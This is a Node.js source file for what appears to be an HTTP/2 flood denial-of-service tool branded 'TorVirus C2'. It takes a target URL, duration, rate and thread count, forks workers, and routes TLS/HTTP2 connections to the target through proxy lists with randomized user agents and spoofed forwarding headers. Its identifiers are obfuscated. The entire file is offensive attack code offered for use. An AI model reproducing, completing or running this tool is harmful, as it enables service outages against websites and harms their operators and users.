const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require('cluster');
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
process.setMaxListeners(0x0);
require('events').EventEmitter.defaultMaxListeners = 0x0;
if (process.argv.length < 0x5) {
  console.log("\n    You can't copy me (Â¬_Â¬ ) (t.me/Op_TakeDown) \n ");
  process.exit();
}
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], ...defaultCiphers.slice(0x3)].join(':');
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const headers = {};
const secureContextOptions = {
  'ciphers': ciphers,
  'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
  'honorCipherOrder': true,
  'secureOptions': secureOptions,
  'secureProtocol': 'TLS_client_method'
};
const secureContext = tls.createSecureContext(secureContextOptions);
var proxies = fs.readFileSync("root/proxy.txt", "utf-8").toString().split(/\r?\n/);
var userAgents = fs.readFileSync("root/ua.txt", "utf-8").toString().split(/\r?\n/);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5]
};
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
  console.clear();
  console.log("TorVirus C2");
  console.log('');
  console.log('');
  console.log("[Broadcast] Attack has sent succesfully ");
  console.log("[Broadcast] Target: " + parsedTarget.host + "[0m");
  console.log("[Broadcast] Duration: " + args.time + "[0m");
  console.log("[Broadcast] Threads: " + args.threads + "[0m");
  console.log("[Broadcast] Requests per second: " + args.Rate + "[0m");
  console.log("[Broadcast] Status: Succes!");
  console.log('');
  setTimeout(() => {
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
} else {
  for (let i = 0x0; i < 0xa; i++) {
    setInterval(runFlooder, 0x0);
  }
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x4a8fef, _0x221a85) {
    const _0x135486 = "CONNECT " + _0x4a8fef.address + ":443 HTTP/1.1\r\nHost: " + _0x4a8fef.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x28f0f9 = new Buffer.from(_0x135486);
    const _0x3c266d = net.connect({
      'host': _0x4a8fef.host,
      'port': _0x4a8fef.port,
      'allowHalfOpen': true,
      'writable': true,
      'readable': true
    });
    _0x3c266d.setTimeout(_0x4a8fef.timeout * 0x2710);
    _0x3c266d.setKeepAlive(true, 0x2710);
    _0x3c266d.setNoDelay(true);
    _0x3c266d.on("connect", () => {
      _0x3c266d.write(_0x28f0f9);
    });
    _0x3c266d.on("data", _0x11b2ae => {
      const _0x4665ab = _0x11b2ae.toString("utf-8");
      const _0xe07e94 = _0x4665ab.includes("HTTP/1.1 200");
      if (_0xe07e94 === false) {
        _0x3c266d.destroy();
        return _0x221a85(undefined, "error: invalid response from proxy server");
      }
      return _0x221a85(_0x3c266d, undefined);
    });
    _0x3c266d.on("timeout", () => {
      _0x3c266d.destroy();
      return _0x221a85(undefined, "error: timeout exceeded");
    });
    _0x3c266d.on('error', _0x5ca110 => {
      _0x3c266d.destroy();
      return _0x221a85(undefined, "error: " + _0x5ca110);
    });
  }
}
const Socker = new NetSocket();
function readLines(_0x356d48) {
  return fs.readFileSync(_0x356d48, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x47f994, _0x59cbd6) {
  return Math.floor(Math.random() * (_0x59cbd6 - _0x47f994) + _0x47f994);
}
function randomElement(_0x14efb8) {
  return _0x14efb8[Math.floor(Math.random() * (_0x14efb8.length - 0x0) + 0x0)];
}
function randomCharacters(_0x623501) {
  output = '';
  for (let _0x32b89b = 0x0; _0x32b89b < _0x623501; _0x32b89b++) {
    output += characters[Math.floor(Math.random() * (characters.length - 0x0) + 0x0)];
  }
  return output;
}
headers[':method'] = "GET";
headers[":path"] = parsedTarget.path;
headers[':scheme'] = "https";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers['accept-language'] = 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3';
headers["accept-encoding"] = "gzip, deflate, br";
headers['x-forwarded-proto'] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = ['?0', '?1'][Math.floor(Math.random() * (['?0', '?1'].length - 0x0) + 0x0)];
headers["sec-ch-ua-platform"] = ["Android", "iOS", "Linux", 'macOS', "Windows"][Math.floor(Math.random() * (["Android", "iOS", "Linux", 'macOS', "Windows"].length - 0x0) + 0x0)];
headers["sec-fetch-dest"] = 'document';
headers['sec-fetch-mode'] = 'navigate';
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = '1';
function runFlooder() {
  const _0x55253c = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0xb68324 = _0x55253c.split(':');
  headers[':authority'] = parsedTarget.host;
  headers["user-agent"] = userAgents[Math.floor(Math.random() * (userAgents.length - 0x0) + 0x0)];
  headers["x-forwarded-for"] = _0xb68324[0x0];
  const _0x436e34 = {
    'host': _0xb68324[0x0],
    'port': ~~_0xb68324[0x1],
    'address': parsedTarget.host + ':443',
    'timeout': 0xf
  };
  Socker.HTTP(_0x436e34, (_0x55caab, _0x42549b) => {
    if (_0x42549b) {
      return;
    }
    _0x55caab.setKeepAlive(true, 0xea60);
    _0x55caab.setNoDelay(true);
    const _0x549bed = {
      'enablePush': false,
      'initialWindowSize': 0x3fffffff
    };
    const _0x12d2ce = {
      'port': 0x1bb,
      'secure': true,
      'ALPNProtocols': ['h2'],
      'ciphers': ciphers,
      'sigalgs': "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      'requestCert': true,
      'socket': _0x55caab,
      'ecdhCurve': "GREASE:x25519:secp256r1:secp384r1",
      'honorCipherOrder': false,
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'clientCertEngine': "dynamic",
      'secureOptions': secureOptions,
      'secureContext': secureContext,
      'servername': parsedTarget.host,
      'secureProtocol': 'TLS_client_method'
    };
    const _0x2298f4 = tls.connect(0x1bb, parsedTarget.host, _0x12d2ce);
    _0x2298f4.allowHalfOpen = true;
    _0x2298f4.setNoDelay(true);
    _0x2298f4.setKeepAlive(true, 60000);
    _0x2298f4.setMaxListeners(0x0);
    const _0x3b20e8 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': _0x549bed,
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x2298f4
    });
    _0x3b20e8.setMaxListeners(0x0);
    _0x3b20e8.settings(_0x549bed);
    _0x3b20e8.on("connect", () => {});
    _0x3b20e8.on("close", () => {
      _0x3b20e8.destroy();
      _0x55caab.destroy();
      return;
    });
    _0x3b20e8.on("error", _0x27bfb8 => {
      _0x3b20e8.destroy();
      _0x55caab.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);
process.on("uncaughtException", _0x2c0a8b => {});
process.on("unhandledRejection", _0x6b405a => {});